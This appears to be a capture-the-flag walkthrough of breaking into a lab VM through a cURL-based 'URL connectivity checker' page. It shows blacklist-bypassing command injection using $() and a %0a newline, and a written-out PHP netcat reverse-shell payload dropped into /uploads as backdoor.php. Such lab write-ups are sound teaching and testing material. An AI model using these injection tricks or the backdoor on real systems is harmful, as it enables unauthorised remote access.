Booting up the VM gives you the IP of the target:

An NMAP scan of all ports `nmap -p- 192.168.1.143` returns port 80 open, running and HTTP service.

Visiting this in a browser I am presented a page with some kind of "URL connectivity checker" which just returns the resource or the URL that is entered.

Looking at the output it is pretty clear the backend is using cUrl to return the requested URL. A couple things pop into my mind, maybe LFI or better yet RCE. 

Before poking at this I went ahead and started bruteforcing directories in the background:

Looking back at index.php I tried a few things the first being LFI.

Ok, cool so I can view files on the system maybe there is something interesting we can find, but before spending time looking for interesting files let me see if I can just acheive RCE and get a reverse shell.

I tried some different input that would allow me to append a command to the cUrl command that retreives the resource and it seemed there was some kind of black listing. This prevented me from using something straight forward like, `&` or `|`.

Since blacklisting is never a good way to go when preventing input there has to be a way to get a command to execute. Sure enough I found a few different ways to do this. 

I can use something like `$(whoami)` which will evaluate the command in the parenthesis before executing the curl command and return the output in the error.

Intercepting the POST request in Burpsuite I was able to insert a URL encoded newline charater `%0a` followed by any command which will execute the command.

I ended up figuring out that I can also just redirect the output of the cUrl command to a file. Looking back at the directory brute force I had started, there is a directory called `/uploads` which is likley writable by www-data.

I created a file on my attacker machine that contained some PHP to execute netcat on the target and connect back to my machine giving me a bash shell `<?php system('nc -c "/bin/bash" 192.168.1.139 444);?>`. Then started up a python simple http sever and requested this file using the interface of the target web app and redirected the output to a file in the uploads directory like so: `http://192.168.1.139:555/backdoor > ./uploads/backdoor.php`. The `>` is redirecting this output of the cUrl command which will be the PHP of the file I created on my attacker machine and putting it into a file called backdoor.php.

Check if the file successfully ended up in `/uploads`

Yup, ok now I have my reverse shell on the target machine I can startup netcat on my attacker machine and get a connection.

Spawn a proper shell.

Now I can start looking around.
